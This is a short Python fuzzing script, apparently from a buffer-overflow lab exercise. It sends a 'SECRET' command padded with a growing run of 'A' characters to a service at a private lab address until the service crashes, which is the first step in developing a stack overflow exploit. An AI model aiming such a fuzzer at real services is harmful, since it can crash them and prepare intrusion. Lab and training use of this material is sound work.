#!/usr/bin/env python3

import socket, time 

ip = '192.168.1.4'
port = 13337
timeout = 5
command = "SECRET " 

string = command + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(command)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(command)))
    exit(0)
  string += 100 * "A"
  time.sleep(1)
  